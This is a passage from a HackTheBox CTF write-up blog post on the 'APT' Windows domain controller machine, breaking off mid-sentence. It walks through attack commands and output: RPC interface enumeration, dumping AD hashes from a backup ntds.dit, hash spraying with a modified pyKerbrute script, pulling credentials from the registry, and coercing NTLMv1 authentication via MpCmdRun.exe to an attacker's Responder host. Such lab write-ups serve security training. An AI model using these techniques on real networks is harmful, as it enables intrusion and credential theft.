<!doctype html><html lang=en dir=auto>
<head><meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge">
<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
<meta name=robots content="index, follow">
<title>HackTheBox - APT | Ef's log</title>
<meta name=keywords content="HackTheBox,Writeup,Cyber Security,Pentesting">
<meta name=description content="Learn remote computer network interface enumeration via MSRPC and exploiting NTLMv1">
<meta name=author content="Fahmi FJ">
<link rel=canonical href=https://fahmifj.github.io/writeups/hackthebox/htb-apt/>
<meta name=google-site-verification content="LlCRq--iL8r1HTz1DMbMvQyX2lZjWD-KnwFeO_OWlg8">
<link crossorigin=anonymous href=https://fahmifj.github.io/assets/css/stylesheet.min.e4fa5d9e6235265db00abdee7d0c336d84263e9ab0a51d6988eaf932dd1b67e0.css integrity="sha256-5PpdnmI1Jl2wCr3ufQwzbYQmPpqwpR1piOr5Mt0bZ+A=" rel="preload stylesheet" as=style>
<link rel=preload href=https://fahmifj.github.io/resources/itsfj.png as=image>
<script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://fahmifj.github.io/favicon.ico>
<link rel=icon type=image/png sizes=16x16 href=https://fahmifj.github.io/favicon-16x16.png>
<link rel=icon type=image/png sizes=32x32 href=https://fahmifj.github.io/favicon-32x32.png>
<link rel=apple-touch-icon href=https://fahmifj.github.io/apple-touch-icon.png>
<link rel=mask-icon href=https://fahmifj.github.io/safari-pinned-tab.svg>
<meta name=theme-color content="#2e2e33">
<meta name=msapplication-TileColor content="#2e2e33">
<meta name=generator content="Hugo 0.87.0">
<script async src="https://www.googletagmanager.com/gtag/js?id=G-PDN0GP97D1"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-PDN0GP97D1',{anonymize_ip:!1})}</script>
<meta property="og:title" content="HackTheBox - APT">
<meta property="og:description" content="Learn remote computer network interface enumeration via MSRPC and exploiting NTLMv1">
<meta property="og:type" content="article">
<meta property="og:url" content="https://fahmifj.github.io/writeups/hackthebox/htb-apt/">
<meta property="og:image" content="https://fahmifj.github.io/writeups/hackthebox/htb-apt/imgs/image-20210416215141773.png"><meta property="article:section" content="writeups">
<meta property="article:published_time" content="2021-04-17T00:09:51+07:00">
<meta property="article:modified_time" content="2021-04-17T00:09:51+07:00">
<meta name=twitter:card content="summary_large_image">
<meta name=twitter:image content="https://fahmifj.github.io/writeups/hackthebox/htb-apt/imgs/image-20210416215141773.png">
<meta name=twitter:title content="HackTheBox - APT">
<meta name=twitter:description content="Learn remote computer network interface enumeration via MSRPC and exploiting NTLMv1">
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Write-ups","item":"https://fahmifj.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox","item":"https://fahmifj.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"HackTheBox - APT","item":"https://fahmifj.github.io/writeups/hackthebox/htb-apt/"}]}</script>
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HackTheBox - APT","name":"HackTheBox - APT","description":"Learn remote computer network interface enumeration via MSRPC and exploiting NTLMv1","keywords":["HackTheBox","Writeup","Cyber Security","Pentesting"],"articleBody":"APT is an insane difficulty Windows machine from HackTheBox and it starts with enumeration on RPC services to get a list of MSRPC interfaces. One of the interface called IObjectExporter has a method named ServerAlive() can be abused to reveals the IPv6 address of the machine. There is a share contains a backup file of AD database and it can be extracted to obtain all the users' hashes. Brute-force attack is performed to obtain one valid credentials from these hashes. With these credentials, I’m able to send a query to the registry and obtain another set of credentials for remote access to the system. A PowerShell history reveals that the machine is configured to accept NTLMv1 authentication, which is then exploited to get Administrator access.\nSkills Learned  RPC enumeration Port Forwarding Remote Registry Exploiting NTLMv1  Tools  Nmap Gobuster - https://github.com/OJ/gobuster Impacket - https://github.com/SecureAuthCorp/impacket IOXIDResolver - https://github.com/mubix/IOXIDResolver CrackMapExec - https://github.com/byt3bl33d3r/CrackMapExec Socat Kerbrute - https://github.com/ropnop/kerbrute pyKerbrute - https://github.com/3gstudent/pyKerbrute Responder - https://github.com/lgandx/Responder  Reconnaissance Nmap - IPv4 Both the initial scan and full scan with nmap shows two open ports: HTTP with IIS server on port 80, and MSRPC on port 135.\n→ root@iamf «apt» «10.10.14.72» $ nmap -sC -sV -oA nmap/initial-apt '10.10.10.213' -v PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: Gigantic Hosting | Home 135/tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Enumeration TCP 80 - Website Visiting port 80 on the browser shows up a website called “Gigantic Hosting”.\nThe input vectors on https://10.13.38.16/contact-post.html don’t appear to be neither vulnerable nor injectable.\nIt sends a post request with an empty body to a host that can not be resolved by my network.\nHere is the example request.\nPOST https://10.13.38.16/contact-post.html HTTP/1.1 Host: 10.13.38.16 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: http://10.10.10.213/support.html Content-Type: application/x-www-form-urlencoded Content-Length: 0 Connection: keep-alive Upgrade-Insecure-Requests: 1 I did ran gobuster, but didn’t find anything interesting.\nTCP 135 - MSRPC Remote Procedure Call (RPC) allows applications to invoke a function (or procedure or subroutine) of a remote computer without having to understand the network’s details, and MSRPC is Microsoft’s enhanced version of DCE/RPC. MSRPC works together with the Distributed Component Object Model (DCOM), and DCOM provides a mechanism for exposing application objects and it consists of a set of RPC interfaces that can be implemented over any RPC Transport.\nDCOM and RPC endpoint mapper sit on port 135 (both of them run on the shared process of svchost.exe). The RPC endpoint mapper maintains the database of endpoints that clients use to map an interface to endpoints, and there is a tool called rpcdump.py from Impacket that can be used to dump those endpoints:\n→ root@iamf «apt» «10.10.14.72» $ rpcdump.py -port 135 '10.10.10.213' [*] Retrieving endpoint list from 10.10.10.213 ...[SNIP]... Protocol: [MS-RSP]: Remote Shutdown Protocol Provider: wininit.exe UUID : D95AFE70-A6D5-4259-822E-2C84DA1DDB0D v1.0 Bindings: ncacn_ip_tcp:10.10.10.213[49664] ncalrpc:[WindowsShutdown] ncacn_np:\\\\APT[\\PIPE\\InitShutdown] ncalrpc:[WMsgKRpc06C4F0] ...[SNIP]... [*] Received 265 endpoints. ncacn_http, ncacn_np, ncacn_ip_tcp are known as protocol string/protocol sequence. It is the language (protocol) that a network operating system uses to talk over the network to other computers [source].\nScan for Listening RPC Interfaces I can use rpcmap.py, which also from Impacket, to get a list of currently listening RPC interfaces that are accessible over TCP/IP.\n→ root@iamf «apt» «10.10.14.72» $ rpcmap.py 'ncacn_ip_tcp:10.10.10.213[135]' -brute-uuid ...[SNIP]... Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote Provider: rpcss.dll UUID: 000001A0-0000-0000-C000-000000000046 v0.0 Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote Provider: rpcss.dll UUID: 4D9F4AB8-7D1C-11CF-861E-0020AF6E7C57 v0.0 Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote Provider: rpcss.dll UUID: 99FCFEC4-5260-101B-BBCB-00AA0021347A v0.0 ...[SNIP]... [*] Tested 354 UUID(s) From the results above, three of them are the interfaces provided by DCOM, details of those interfaces are documented by Microsoft in well-known UUIDs.\n   Name GUID Purpose Definition     IID_IRemoteSCMActivator {000001A0-0000-0000-C000-000000000046} RPC interface UUID for IRemoteSCMActivator RemoteSCMActivator is another remote activation interface of the DCOM Remote Protocol.   IID_IActivation {4d9f4ab8-7d1c-11cf-861e-0020af6e7c57} RPC interface UUID for IActivation IActivation is the DCOM Remote Protocol remote activation interface supported on all versions of the DCOM Remote Protocol   IID_IObjectExporter {99fcfec4-5260-101b-bbcb-00aa0021347a} RPC interface UUID for IObjectExporter IObjectExporter is the interface used for OXID resolution, pinging, and server aliveness tests. All object resolvers MUST support the IObjectExporter interface    Network Interfaces Enumeration According to this post, written by Nicolas Delhaye, the ServerAlive2() method in IObjectExport (also known as IOXIDResolver) interface can be used to retrieve a list of network interfaces of a remote computer. Nicolas also provides the PoC for this.\n Opnum is operation number to identify a specific rpc method or a method in an interface.\n I can use rpcmap.py with -brute-opnums option to determine which interface’s methods are accessible, and the IObjectExport interface shows that Opnum 3 and Opnum 5 are accessible, this means access to ServerAlive() is allowed.\n→ root@iamf «rpc-enum» «10.10.14.72» $ rpcmap.py -brute-opnums -opnum-max 5 'ncacn_ip_tcp:10.10.10.213' ...[SNIP]... Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote Provider: rpcss.dll UUID: 99FCFEC4-5260-101B-BBCB-00AA0021347A v0.0 Opnum 0: rpc_x_bad_stub_data Opnum 1: rpc_x_bad_stub_data Opnum 2: rpc_x_bad_stub_data Opnum 3: success Opnum 4: rpc_x_bad_stub_data Opnum 5: success From here, I can use the provided PoC script.\n#!/usr/bin/python import sys, getopt from impacket.dcerpc.v5 import transport from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_NONE from impacket.dcerpc.v5.dcomrt import IObjectExporter def main(argv): try: opts, args = getopt.getopt(argv,\"ht:\",[\"target=\"]) except getopt.GetoptError: print 'IOXIDResolver.py -t ' sys.exit(2) target_ip = \"192.168.1.1\" for opt, arg in opts: if opt == '-h': print('IOXIDResolver.py -t ') sys.exit() elif opt in (\"-t\", \"--target\"): target_ip = arg authLevel = RPC_C_AUTHN_LEVEL_NONE stringBinding = r'ncacn_ip_tcp:%s' % target_ip rpctransport = transport.DCERPCTransportFactory(stringBinding) portmap = rpctransport.get_dce_rpc() portmap.set_auth_level(authLevel) portmap.connect() objExporter = IObjectExporter(portmap) bindings = objExporter.ServerAlive2() print(\"[*] Retrieving network interface of \" + target_ip) for binding in bindings: NetworkAddr = binding['aNetworkAddr'] print \"Address: \" + NetworkAddr if __name__ == \"__main__\": main(sys.argv[1:]) The script returns with two IPv6 addresses of the machine.\n→ root@iamf «rpc-enum» «10.10.14.72» $ ./IOXIDResolver.py -t '10.10.10.213' [*] Retrieving network interface of 10.10.10.213 Address: apt Address: 10.10.10.213 Address: dead:beef::b885:d62a:d679:573f Address: dead:beef::89df:c1d4:6aaf:67ce I will add these addresses to my /etc/hosts file.\n→ root@iamf «rpc-enum» «10.10.14.72» $ echo 'dead:beef::b885:d62a:d679:573f apt'  /etc/hosts Nmap - IPv6 I will run another nmap scan against the machine on the IPv6 address.\n For me, scanning these two addresses returns the same results.\n This time, nmap shows the common ports of Active Directory domain controller.\n→ root@iamf «apt» «10.10.14.72» $ nmap -6 --min-rate 1000 -sC -sV -oA nmap/initial-apt-ipv6 'dead:beef::b885:d62a:d679:573f' -v ...[SNIP]... PORT STATE SERVICE VERSION 53/tcp open domain? | fingerprint-strings: | DNSVersionBindReqTCP: | version |_ bind 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: Gigantic Hosting | Home 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2021-04-15 00:36:03Z) 135/tcp open msrpc Microsoft Windows RPC 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=apt.htb.local | Subject Alternative Name: DNS:apt.htb.local | Issuer: commonName=apt.htb.local | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2020-09-24T07:07:18 | Not valid after: 2050-09-24T07:17:18 | MD5: c743 dd92 e928 50b0 aa86 6f80 1b04 4d22 |_SHA-1: f677 c290 98c0 2ac5 8575 7060 683d cdbc 5f86 5d45 |_ssl-date: 2021-04-15T00:38:57+00:00; -1s from scanner time. 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=apt.htb.local | Subject Alternative Name: DNS:apt.htb.local | Issuer: commonName=apt.htb.local | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2020-09-24T07:07:18 | Not valid after: 2050-09-24T07:17:18 | MD5: c743 dd92 e928 50b0 aa86 6f80 1b04 4d22 |_SHA-1: f677 c290 98c0 2ac5 8575 7060 683d cdbc 5f86 5d45 |_ssl-date: 2021-04-15T00:38:57+00:00; -1s from scanner time. 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port53-TCP:V=7.80%I=7%D=4/14%Time=60778A78%P=x86_64-pc-linux-gnu%r(DNSV SF:ersionBindReqTCP,20,\"\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07version\\ SF:x04bind\\0\\0\\x10\\0\\x03\"); Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: -12m00s, deviation: 26m48s, median: -1s | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: apt | NetBIOS computer name: APT\\x00 | Domain name: htb.local | Forest name: htb.local | FQDN: apt.htb.local |_ System time: 2021-04-15T01:38:41+01:00 | smb-security-mode: | account_used:  | authentication_level: user | challenge_response: supported |_ message_signing: required | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2021-04-15T00:38:39 |_ start_date: 2021-04-14T16:50:06 I will take notes on:\n  Domain name: htb.local\n  FQDN: apt.htb.local\n  Host: Windows Server 2016 Standard 14393\n  On a full port scan, there is a WinRM listening on IPv6.\n→ root@iamf «rpc-enum» «10.10.14.72» $ nmap -p- --min-rate 1000 -6 -v 'dead:beef::b885:d62a:d679:573f' ...[SNIP]... PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 389/tcp open ldap 445/tcp open microsoft-ds 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman ...[SNIP]... TCP 445 - SMB (IPv6) Anonymous access is allowed on SMB. The backup share seems interesting here, so I will dig into that share.\n→ root@iamf «apt» «10.10.14.72» $ smbclient -N -L //apt Anonymous login successful Sharename Type Comment --------- ---- ------- backup Disk IPC$ IPC Remote IPC NETLOGON Disk Logon server share SYSVOL Disk Logon server share apt is an IPv6 address -- no workgroup available In the backup share, there is a file calledbackup.zip . I will download it to my Kali.\n→ root@iamf «apt» «10.10.14.72» $ smbclient -N //apt/backup Anonymous login successful Try \"help\" to get a list of possible commands. smb: \\ dir . D 0 Thu Sep 24 03:30:52 2020 .. D 0 Thu Sep 24 03:30:52 2020 backup.zip A 10650961 Thu Sep 24 03:30:32 2020 10357247 blocks of size 4096. 6964173 blocks available smb: \\ get backup.zip getting file \\backup.zip of size 10650961 as backup.zip (502.9 KiloBytes/sec) (average 502.9 KiloBytes/sec) Zip Crack The backup file is protected with a password. So I will use zip2john.py to convert this backup.zip into crackable hash format, and then transfer the hash to my Windows for cracking.\n→ root@iamf «loot» «10.10.14.72» $ zip2john backup.zip  backup.zip.hash → root@iamf «loot» «10.10.14.72» $ cat backup.zip.hash backup.zip:$pkzip2$3*1*1*0*8*24*9beb*9ac6*0f135e8d5f02f852643d295a889cbbda196562ad42425146224a8804421ca88f999017ed*1*0*8*24*acd0*9cca*0949e46299de5eb626c75d63d010773c62b27497d104ef3e2719e225fbde9d53791e11a5*2*0*156*4000*2a393785*81733d*37*8*156*2a39*9cca*0325586c0d2792d98131a49d1607f8a2215e39d59be74062d0151084083c542ee61c530e78fa74906f6287a612b18c788879a5513f1542e49e2ac5cf2314bcad6eff77290b36e47a6e93bf08027f4c9dac4249e208a84b1618d33f6a54bb8b3f5108b9e74bc538be0f9950f7ab397554c87557124edc8ef825c34e1a4c1d138fe362348d3244d05a45ee60eb7bba717877e1e1184a728ed076150f754437d666a2cd058852f60b13be4c55473cfbe434df6dad9aef0bf3d8058de7cc1511d94b99bd1d9733b0617de64cc54fc7b525558bc0777d0b52b4ba0a08ccbb378a220aaa04df8a930005e1ff856125067443a98883eadf8225526f33d0edd551610612eae0558a87de2491008ecf6acf036e322d4793a2fda95d356e6d7197dcd4f5f0d21db1972f57e4f1543c44c0b9b0abe1192e8395cd3c2ed4abec690fdbdff04d5bb6ad12e158b6a61d184382fbf3052e7fcb6235a996*$/pkzip2$::backup.zip:Active Directory/ntds.jfm, registry/SECURITY, Active Directory/ntds.dit:backup.zip Jtr recovers the password toiloveyousomuch instantly. Now I can unzip the backup file.\nC:\\tools\\john\\run ./john.exe hashes/backup.zip.hash --wordlist=C:/tools/rockyou.txt ...[SNIP]... iloveyousomuch (backup.zip) 1g 0:00:00:00 DONE (2021-04-15 08:29) 35.71g/s 585142p/s 585142c/s 585142C/s 123456..christal This backup contains AD database.\n→ root@iamf «loot» «10.10.14.72» $ tree . ├── Active Directory │ ├── ntds.dit │ └── ntds.jfm └── registry ├── SECURITY └── SYSTEM Dumping NTLM Hashes ntds.dit is a database file for Active Directory environment, I can supply the SECURITY and SYSTEM files to secretsdump.py to extract all the NTLM hashes of all the available AD user accounts.\n NTDS stands for New Technology Directory Service and DIT stands for directory information tree.\n → root@iamf «loot» «10.10.14.72» $ secretsdump.py -ntds Active\\ Directory/ntds.dit -system registry/SYSTEM -security registry/SECURITY LOCAL  ad_hashes I saved the hash to a file called ad_hashes.\nTCP 88 - Kerberos Finding Valid Usernames Because there are so many data to try, I might accidentally get locked out if spraying blindly. But, with tools called Kerbrute, I can enumerate for valid users. The tools uses Kerberos pre-auth to determine a valid user.\nIf the user is a valid user, KDC returns UF_DONT_REQUIRE_PREAUTH. If it’s not, it returns KDC_ERR_C_PRINCIPAL_UNKNOWN.\nBefore that, I’ll pull the users and NTLM hash from ad_hashes and store them in separate list. I’ll feed users.list to kerbrute.\nusers.list\n→ root@iamf «loot» «10.10.14.72» $ cat ad_hashes | grep 'aad3b435b51404eeaad3b435b51404ee' | cut -d : -f1  ../users.list userhash.list\n→ root@iamf «loot» «10.10.14.72» $ cat ad_hashes | grep 'aad3b435b51404eeaad3b435b51404ee' | cut -d : -f4  ../userhash.list I ran kerbrute, and after some time, it returned three legitimate users.\n→ root@iamf «apt» «10.10.14.72» $ kerbrute userenum --dc apt --domain htb.local users.list ...[SNIP]... 2021/04/14 22:02:35  Using KDC(s): 2021/04/14 22:02:35  apt:88 2021/04/14 22:03:12  [+] VALID USERNAME: APT$@htb.local 2021/04/14 22:03:12  [+] VALID USERNAME: Administrator@htb.local 2021/04/14 22:07:31  [+] VALID USERNAME: henry.vinson@htb.local 2021/04/14 22:15:52  Done! Tested 2001 usernames (3 valid) in 796.320 second APT$ is an account used for authentication purposes in the domain, it can not be used to login into the system. Because of that, I’ll only keep administrator and henry.vinson on the list of valid users. But if I have a valid NT hash of this account, that would be very useful as it can be used for DCSync attack.\nHash Brute-force Using henry.vinson:2de80758521541d19cabba480b260e8f pair returns an authorization error message.\n→ root@iamf «apt» «10.10.14.72» $ evil-winrm -i apt -u henry.vinson -H 2de80758521541d19cabba480b260e8f Evil-WinRM shell v2.4 Info: Establishing connection to remote endpoint Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError Error: Exiting with code 1 Another option is to spray the NTLM hashes on henry.vinson.\nUnfortunately, kerbrute doesn’t support pass-the-hash yet. But there is a Python version of kerbrute called pyKerbrute. One of its tools called ADPwdSpray.py supports bruteforcing with hash.\n https://github.com/3gstudent/pyKerbrute  → root@iamf «apt» «10.10.14.72» $ git clone https://github.com/3gstudent/pyKerbrute.git By default, it only supports a single hash, so I’ve modified it a bit to work with a list of hashes and IPv6.\n...[SNIP]... if __name__ == '__main__': kdc_a = sys.argv[1] # apt user_realm = sys.argv[2].upper() # htb.local user_name = sys.argv[3] # henry.vinson, administrator hashes = open(sys.argv[4], 'r').readlines() # aad3...hashes print('[*] DomainControlerAddr: %s'%(kdc_a)) print('[*] DomainName: %s'%(user_realm)) for user_hash in hashes: sys.stdout.write('\\r[*] Trying hash: %s'%(user_hash)) # to make sure it checks every hash in list user_key = (RC4_HMAC, user_hash.strip('\\r\\n').decode('hex')) passwordspray_tcp(user_realm, user_name, user_key, kdc_a, user_hash) After a few minutes, it returns a valid hash that works on henry.vinson\n→ root@iamf «pyKerbrute» «10.10.14.72» $ wc -c ../userhash.list 66001 userhash.list → root@iamf «pyKerbrute» «10.10.14.72» git:(temp) ✗ $ python ADPwdSpray.py apt htb.local 'henry.vinson' ../userhash.list | tee ../pykerbrute-spray [*] DomainControlerAddr: apt [*] DomainName: HTB.LOCAL ...[SNIP]... [+] Valid Login: henry.vinson:e53d87d42adaa3ca32bdb34a876cbffb Foothold Shell as henry.vinson_adm Forwarding IPv4 - IPv6 Here, a relay or a port forwarding is required to make some tools work on IPv6. I came up with two solutions:\nFirst, use socat.\n→ root@iamf «apt» «10.10.14.72» $ socat tcp-listen:445,fork tcp6:apt:445 Second, use ssh.\n→ root@iamf «apt» «10.10.14.72» $ ssh -L 445:apt:445 root@localhost -Nf → root@iamf «apt» «10.10.14.72» $ netstat -tlpn Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:445 0.0.0.0:* LISTEN 8548/ssh tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 8087/sshd: /usr/sbin tcp6 0 0 ::1:445 :::* LISTEN 8548/ssh I can confirm both forwarding options work by running CrackMapExec to localhost using henry.vinson creds\n→ root@iamf «apt» «10.10.14.72» $ crackmapexec smb localhost -u henry.vinson -H e53d87d42adaa3ca32bdb34a876cbffb SMB 127.0.0.1 445 APT [*] Windows Server 2016 Standard 14393 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True) SMB 127.0.0.1 445 APT [+] htb.local\\henry.vinson e53d87d42adaa3ca32bdb34a876cbffb Registry Enumeration henry.vinson can not be used to login remotely into the box.\n→ root@iamf «apt» «10.10.14.72» $ evil-winrm -i apt -u henry.vinson -H e53d87d42adaa3ca32bdb34a876cbffb Evil-WinRM shell v2.4 Info: Establishing connection to remote endpoint Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError Error: Exiting with code 1 Instead, I can perform enumeration on the user registry using reg.py from Impacket.\n→ root@iamf «apt» «10.10.14.72» $ reg.py htb.local/henry.vinson@apt -hashes 'e53d87d42adaa3ca32bdb34a876cbffb:e53d87d42adaa3ca32bdb34a876cbffb' query -keyName HKU Impacket v0.9.22.dev1+20200914.162022.81d44893 - Copyright 2020 SecureAuth Corporation [!] Cannot check RemoteRegistry status. Hoping it is started... HKU HKU\\Console HKU\\Control Panel HKU\\Environment HKU\\Keyboard Layout HKU\\Network HKU\\Software HKU\\System HKU\\Volatile Environment Checking on HKU\\Software is worth trying since some applications may store their credentials in a registry.\n→ root@iamf «apt» «10.10.14.72» $ reg.py htb.local/henry.vinson@apt -hashes 'e53d87d42adaa3ca32bdb34a876cbffb:e53d87d42adaa3ca32bdb34a876cbffb' query -keyName HKU\\\\Software Impacket v0.9.22.dev1+20200914.162022.81d44893 - Copyright 2020 SecureAuth Corporation [!] Cannot check RemoteRegistry status. Hoping it is started... HKU\\Software HKU\\Software\\GiganticHostingManagementSystem HKU\\Software\\Microsoft HKU\\Software\\Policies HKU\\Software\\RegisteredApplications HKU\\Software\\VMware, Inc. HKU\\Software\\Wow6432Node HKU\\Software\\Classes The HKU\\Software\\GiganticHostingManagementSystem contains a set of credentials for username henry.vinson_adm and a password of G1#Ny5@2dvht.\n→ root@iamf «apt» «10.10.14.72» $ reg.py htb.local/henry.vinson@apt -hashes 'e53d87d42adaa3ca32bdb34a876cbffb:e53d87d42adaa3ca32bdb34a876cbffb' query -keyName HKU\\\\Software\\\\GiganticHostingManagementSystem Impacket v0.9.22.dev1+20200914.162022.81d44893 - Copyright 2020 SecureAuth Corporation [!] Cannot check RemoteRegistry status. Hoping it is started... HKU\\Software\\GiganticHostingManagementSystem UserName REG_SZ henry.vinson_adm PassWord REG_SZ G1#Ny5@2dvht Remote Access henry.vinson_adm credentials can be used to gain a foothold on the system remotely. I’ll just grab the user flag.\n→ root@iamf «apt» «10.10.14.72» $ evil-winrm -i apt -u henry.vinson_adm -p 'G1#Ny5@2dvht' Evil-WinRM shell v2.4 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\henry.vinson_adm\\Documents *Evil-WinRM* PS C:\\Users\\henry.vinson_adm\\Documents cd ..\\Desktop *Evil-WinRM* PS C:\\Users\\henry.vinson_adm\\Desktop type user.txt 745212a817f60f27befd...[SNIP]... Privilege Escalation Shell as administrator Enumeration Performing a text file enumeration finds a PowerShell history file.\n*Evil-WinRM* PS C:\\Users\\henry.vinson_adm gci -Path C:\\Users -filter *.txt -Recurse -ErrorAction SilentlyContinue -Force ...[SNIP]... Directory: C:\\Users\\henry.vinson_adm\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 11/10/2020 10:58 AM 458 ConsoleHost_history.txt *Evil-WinRM* PS C:\\Users\\henry.vinson_adm type \"C:\\Users\\henry.vinson_adm\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt\" $Cred = get-credential administrator invoke-command -credential $Cred -computername localhost -scriptblock {Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" lmcompatibilitylevel -Type DWORD -Value 2 -Force} From Wikipedia:\n Send NTLM response only: Clients use NTLM authentication only, and use NTLMv2 session security if server supports it; DCs accept LM, NTLM, and NTLMv2 authentication.\n With lmcompatibilitylevel = 2, it means the authentication process can be downgraded to NTLMv1. The attack is explained in detail here.\nThere is a site called https://crack.sh that provides a service for cracking NTLMv1 hash using rainbow tables for a specific challenge of “1122334455667788”.\nThe idea here is to force APT to make a request (challenge-response) to the server that the attacker controls, which has been configured to send the string “1122334455667788” as the challenge (after downgrading the authentication process to NTLMv1).\nAfter the server receives the response from the given challenge, I can send the NTLMv1 hash from that response to crack.sh for cracking and obtain NTLM/NT hash of APT afterward.\n Note:\n NetNTLM/NTLMv1 is an authentication protocol NetNTLM/NTLMv1 hash != NTLM hash NetNTLM/NTLMv1 hash contains NTLM hash   Stealing NTLMv1 hash via MpCmdRun.exe MpCmdRun.exe is part of Windows Defender that always runs with SYSTEM privileges. I can abuse this behavior to scan a file on my SMB server and capture the NTLMv1 authentication hash.\n This article explaining how authentication proccess over SMB work\n For this, I’ll need to edit /etc/responder/Responder.conf first, and change the challenge from “random” to “1122334455667788”.\nAfter that, I can start Responder to listen on my tun0 interface and specify the --lm option which will downgrade the authentication to NTLMv1.\n→ root@iamf «~» «10.10.14.72» $ responder -I tun0 --lm __ .----.-----.-----.-----.-----.-----.--| |.-----.----. | _| -__|__ --| _ | _ | | _ || -__| _| |__| |_____|_____| __|_____|__|__|_____||_____|__| |__| NBT-NS, LLMNR \u0026 MDNS Responder 2.3.4.0 Author: Laurent Gaffie (laurent.gaffie@gmail.com) To kill this script hit CTRL-C [+] Poisoners: LLMNR [ON] NBT-NS [ON] DNS/MDNS [ON] [+] Servers: HTTP server [ON] HTTPS server [ON] WPAD proxy [OFF] Auth proxy [OFF] SMB server [ON] Kerberos server [ON] SQL server [OFF] FTP server [OFF] IMAP server [OFF] POP3 server [OFF] SMTP server [OFF] DNS server [ON] LDAP server [ON] RDP server [OFF] [+] HTTP Options: Always serving EXE [OFF] Serving EXE [OFF] Serving HTML [OFF] Upstream Proxy [OFF] [+] Poisoning Options: Analyze Mode [OFF] Force WPAD auth [OFF] Force Basic Auth [OFF] Force LM downgrade [ON] Fingerprint hosts [OFF] [+] Generic Options: Responder NIC [tun0] Responder IP [10.10.14.72] Challenge set [1122334455667788] Don't Respond To Names ['ISATAP'] [+] Listening for events... Now on APT, I can force authentication with MpCmdRun.exe (located on C:\\Program Files\\Windows Defender), and it errors out.\n*Evil-WinRM* PS C:\\Program Files\\Windows Defender.\\MpCmdRun.exe -Scan -ScanType 3 -File \\\\10.10.14.72\\notexist Scan starting... CmdTool: Failed with hr = 0x80508023. Check C:\\Users\\HENRY~2.VIN\\AppData\\Local\\Temp\\MpCmdRun.log for more information  Active Directory uses Kerberos as the default authentication method, but it will fallback to NTLM authentication if the client try to connect to other hosts with IP address\n But on my Kali, responder has successfully captured the hash of APT$, the computer account of the box.\n..... [+] Listening for events... [SMB] NTLMv1 Client : 10.10.10.213 [SMB] NTLMv1 Username : HTB\\APT$ [SMB] NTLMv1 Hash : APT$::HTB:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:1122334455667788 When there is no credentials are specified explicitly, 